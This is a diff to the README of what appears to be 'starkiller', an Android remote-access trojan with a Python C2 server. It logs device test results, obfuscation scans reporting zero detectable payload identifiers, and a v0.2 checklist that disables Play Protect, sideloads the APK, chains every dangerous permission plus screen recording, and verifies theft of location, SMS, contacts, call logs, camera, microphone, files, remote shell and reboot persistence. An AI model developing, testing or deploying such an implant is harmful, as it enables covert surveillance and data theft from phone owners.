@@ -214,24 +214,74 @@ Headless integration suite: 38/38 PASS
   Phase 9:  Obfuscation scan (standalone + bound APK)
   Phase 10: Crypto roundtrip (10 strings)
 
-Live device test (Samsung SM-X400, Android 16 — 2026-06-23):
+Live device test v0.1 (Samsung SM-X400, Android 16 — 2026-06-23):
   TCP handshake:   PASS
   Registration:    PASS (manufacturer, model, android_version confirmed)
   sysinfo:         PASS
   apps (294):      PASS
   ping:            PASS (<1s)
-  gps/sms/contacts/calllog: PERMISSION DENIED (runtime grants not yet given)
-  screenshot/vnc:  UNTESTED (runtime permission flow rebuilt — not yet verified on device)
-  camera/mic:      UNTESTED
-
-NOTE: Runtime permission request flow (requestPermissions + MediaProjection on launch)
-rebuilt in commit 3e8354d. NOT YET live-tested on device. Headless tests pass.
+  gps/sms/contacts/calllog: FAIL — permissions not granted at runtime
+  screenshot/vnc:  FAIL — screen grant not persistent
+  camera/mic:      FAIL — permissions not granted at runtime
 
 DEX string scan:
   Standalone APK: 0 payload identifiers in 15,908 strings
   Bound APK:      0 payload identifiers in 268,229 strings
-  APK size (latest): 1371 KB (runtime perm code added)
+  APK size (v0.2): 1371 KB
 ```
+
+---
+
+### ⚠️ v0.2 APK — NOT YET LIVE TESTED
+
+`v0.2` (current release) rebuilds the entire permission + screen grant flow.
+**Uninstall v0.1 before installing.** The new APK has not been run on a real device yet.
+
+#### What changed in v0.2
+- `MainActivity` now calls `requestPermissions()` on launch — prompts user for ALL dangerous perms in one chain
+- MediaProjection (screen recording) grant moved to MainActivity — system dialog fires automatically, no manual `SCR GRANT` button needed
+- Battery optimisation bypass requested on first launch
+- Foreground service type updated to `dataSync|mediaProjection`
+
+#### Testing checklist — do this with v0.2
+
+**Install**
+- [ ] Uninstall old APK
+- [ ] Disable Play Protect (Settings → Google → Play Protect → gear → off)
+- [ ] Install `starkiller-debug.apk` (allow unknown sources)
+- [ ] Open the app
+
+**Permission chain (should fire automatically on first launch)**
+- [ ] Location permission dialog appears → tap Allow
+- [ ] Camera permission dialog appears → tap Allow
+- [ ] Microphone permission dialog appears → tap Allow
+- [ ] SMS permission dialog appears → tap Allow
+- [ ] Contacts permission dialog appears → tap Allow
+- [ ] Call log / Phone permission dialog appears → tap Allow
+- [ ] Storage permission dialog appears → tap Allow
+- [ ] Battery optimization dialog appears → tap Allow
+- [ ] Screen recording dialog appears → tap "Start now"
+
+**C2 connection (run `python server/starkiller_gui.py` first)**
+- [ ] Agent appears in sidebar
+- [ ] sysinfo returns model/OS/carrier
+- [ ] GPS returns coordinates
+- [ ] SMS inbox returns messages
+- [ ] Contacts returns contact list
+- [ ] Call log returns history
+- [ ] Camera returns JPEG (front + rear)
+- [ ] Mic returns audio data
+- [ ] Screenshot returns image (no SCR GRANT needed)
+- [ ] VNC stream shows live frames in panel
+- [ ] Files (ls /sdcard) returns directory listing
+- [ ] Exec (echo test) returns output
+- [ ] Agent persists after phone screen-off (wake lock)
+- [ ] Agent reconnects after WiFi toggle
+
+**Persistence**
+- [ ] Reboot phone → agent reconnects automatically
+
+**Note any failures here and file as issues.**
 
 ### Tools Required
 
